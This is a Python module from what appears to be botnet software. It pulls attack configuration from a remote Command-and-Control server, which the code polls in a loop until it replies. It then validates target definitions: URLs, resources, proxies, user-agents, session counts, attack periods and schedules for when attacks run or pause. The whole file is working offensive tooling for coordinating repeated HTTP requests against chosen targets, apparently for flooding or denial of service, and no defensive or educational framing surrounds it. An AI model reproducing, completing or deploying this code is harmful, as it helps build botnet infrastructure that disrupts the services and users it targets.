"""
This is the set of functions built with the aim to provide a simple
interface for the configuration management for the botnet instance.
It will provide access to the Command-and-Control server as well as
the validation for the configuration dictionary.

Created:    29 December 2016
Modified:   16 February 2017
"""

import json
import requests
from time import time

# CONFIGURATION SCHEMAS
# presetting the root schema for the configuration dictionary
# (default values provided for startup routine)
rootSchema = {
    "last_modified" : round(time()),
    "cc_server"     : "",
    "user-agent_b"  : "ALLSAFE_UADEFAULT",
    "log_file"      : "./data/log.txt",

    "targets"       : []
}
#presetting the target schema for the configuration dictionary
targetSchema = {
    "period"            : 1,
    "max_count"         : 1,
    "action_conditions" : { "AM" : 1, "PM" : 1, "attack_time" : "0-24", "avoid_week" : [], "avoid_month" : [] },
    "request_params"    : {},
    "sessions"          : 1
}
# presetting the request_params schema for the configuration dictionary
requestSchema = {
    "method"        : "GET",
    "url"           : "",
    "resources"     : ["/"],
    "proxy_server"  : { "http" : "", "https" : "" },
    "user-agent"    : rootSchema['user-agent_b'],
    "encoding"      : "UTF-8",
    "payload"       : {},
    "response"      : "raw",
    "response-header" : 0,
    "timeout"       : 0.5
}

def validateConfigFile(config_file, override, ccserver=None):
    """
    This utility is the entry point for every configuration 
    validation. It requires a configuration file to be passed 
    to be validated via C&C and using a particular schema 

    @param config_file, string - path to the configuration .txt or .json
    @param override, boolean - whenever the configuration from ccserver must be ignored
    @param ccserver, string - default None, C&C server remote address
    @return configuration, dictionary or None if error occurs
    """
    
    configuration = {}

    if len(config_file) != 0:
        # 0. retrieving configuration file
        try:
            with open(config_file) as configJSON:
                configuration = json.load(configJSON)
                configJSON.close()
            # if configuration file does not exist... we return None.
        except (FileNotFoundError, IOError, ValueError) as error:
            return None
    
    # 0. check for updates connecting to C&C (if not override option is enabled)
    if (not override):
        # check for ccserver address 
        ccserveraddr = ccserver
        if ('cc_server' in configuration) and (ccserver is None):
            ccserveraddr = configuration['cc_server'] if (len(configuration['cc_server']) > 0) else None
        # waiting for update before launch the attack
        if ccserveraddr:
            while True:
                last_modified = int(configuration['last_modified']) if 'last_modified' in configuration else 0
                cc_config, updated = validateCCUpdate(ccserveraddr, rootSchema, last_modified)
                # check for remote connection success and update local configuration
                if updated:
                    configuration = cc_config
                    if len(config_file) != 0:
                        if not updateConfigFile(config_file, configuration):
                            return None
                    break
        else:
            return None

    

    # 1. compare root schema 
    if configuration.keys() != rootSchema.keys():
        return None
    # set to default
    for setting in ['user-agent_b', 'log_file', 'targets']:
        if len(configuration[setting]) == 0:
            configuration[setting] = rootSchema[setting]

    
    # 2. compare target schema
    targetList = configuration['targets']
    if len(targetList) == 0:
        return configuration
    else:
        for i in range(0, len(targetList)):
            target = targetList[i]
            # check for schema - only few params are necessary!
            if not set(target.keys()).issubset(set(targetSchema.keys())):
                return None
            # check for custom values to be polished or set to default
            for setting in ['max_count', 'sessions']:
                if (int(target[setting]) <= 0) or (setting not in target):
                    target[setting] = targetSchema[setting]
            # check for attack period
            target['period'] = validateAttackPeriod(target['period'], default=1)
            # check for action conditions
            ac = 'action_conditions'
            if ac not in target:
                target[ac] = targetSchema[ac]
            else:
                target[ac] = validateActionConditions(target[ac], targetSchema[ac])

            # 2.1. compare request schema
            if 'request_params' not in target:
                return None
            req = validateRequestParams(target['request_params'], requestSchema)
            # if no url has been setted as a target...
            if req is None:
                return None
            # else we set default request params
            target['request_params'] = req

    return configuration



def validateAttackPeriod(period, default=1):
    """
    This utility is designed to set period according user scenario or providing a default.
    (period is expressed in seconds)

    @param period, string - attack period config. definition
    @param default, integer - optional default value to assign to period 
    @return period 
    """
    # check if period is a single integer 
    try:
        period = int(period)
        if period <= 0:
            period = default
        return [period]
    # in this case we have a range 
    except ValueError:
        periodRange = map((lambda t: int(t)), period.split("-"))
        periodRange = list(periodRange)
        if len(periodRange) == 1:
            raise Exception("Wrong format for period!")
        return periodRange

    


def validateCCUpdate(server, schema, last_modified):
    """
    This utility is designed to provide a minimal interface to update current 
    configuration with the remote command-and-control server.
    Please note that we assume no errors from the C&C config processing...

    @param server, string - C&C remote address
    @param schema, dictionary - default schema in case of disable
    @param last_modified, integer - timestamp representing the last modified attribute
    @return (configuration, updated), (dictionary, boolean) 
    """
    configuration = {}
    # try to perform update of the configuration from the C&C
    try:
        cc_config = requests.get(server + '/settings').json()
        # check for updated instructions
        # C&C update has priority only if it is more recent
        if cc_config['last_modified'] >= last_modified:
            configuration = cc_config
            return configuration, True
        else:
            return configuration, False

    except Exception as e:
        # if an error occurred, we return a non updated status
        return configuration, False



def updateConfigFile(config_file, configuration):
    """
    A simple utility to overwrite the configuration file

    @param config_file, string - path to the configuration .txt or .json
    @param configuration, dictionary - updated configuration
    @return True in case of success, False otherwise
    """
    try:
        with open(config_file, 'w') as configFile:
            configFile.write(json.dumps(configuration))
            configFile.close()
            return True
    except (FileNotFoundError, IOError, ValueError) as error:
        return False


def validateActionConditions(action, schema):
    """
    This utility is used to validate the action conditions or to 
    bring them to default values (attack will be always carried)

    @param action, dictionary - target action conditions dictionary
    @param schema, dictionary - default action conditions
    @return action_conditions, dictionary
    """
    # check for AM / PM - we assume if the param is not present the attack can be carried
    for setting in ['AM', 'PM']:
        if (setting not in action) or (int(action[setting]) < 0) or (int(action[setting]) > 1):
            action[setting] = schema[setting]
        else:
            action[setting] = int(action[setting])
    # check for attack time to be polished 
    # note that it is not necessary to be set to carry the attack!
    at = 'attack_time'
    if at in action:
        attackTime = map((lambda t: int(t) % 24), action[at].split("-"))
        attackTime = list(attackTime)
        if len(attackTime) == 1:
            raise Exception("Wrong format for attack_time!")
        action[at] = str(min(attackTime)) + "-" + str(max(attackTime))
    
    # check for avoid week
    aw = 'avoid_week'
    if aw not in action:
        action[aw] = schema[aw]
    else:
        for i in range(0, len(action[aw])):
            action[aw][i] = int(action[aw][i]) % 7

    # check for avoid month
    am = 'avoid_month'
    if am not in action:
        action[am] = schema[am]
    else:
        for i in range(0, len(action[am])):
            action[am][i] = int(action[am][i]) % 31
    
    # finally we return action conditions
    return action



def validateRequestParams(request, schema):
    """
    This utility is used to validate a request parameters set, 
    without a properly set request the botnet cannot proceed with due 
    efficiency, so the process will be halted raising an exception.

    @param request, dictionary - remote target definition
    @param schema, dictionary - default action conditions
    @return configuration, dictionary or None if error occurs
    """
    # first of all we check if the url is specified
    if ('url' not in request) or (len(request['url']) == 0):
        raise Exception('No url specified!')
        return None
    if ('resources' not in request) or (len(request['resources']) < 1):
        raise Exception('At least one resource is needed to start the attack!')
        return None
    # validating url and resources
    url = request['url']
    if url[len(url) - 1] != '/':
        url += '/'
        request['url'] = url
    resources = request['resources']
    for res in resources:
        if (res[0] == '/') and (len(res) > 1):
            res_id = resources.index(res)
            resources[res_id] = res[1:]

    # check if the other params are to be set or custom
    for param in ['method', 'user-agent', 'encoding', 'payload', 'proxy_server', 'response', 'response-header','timeout']:
        if param not in request:
            request[param] = schema[param]
    
    # finally we return request parameters
    return request
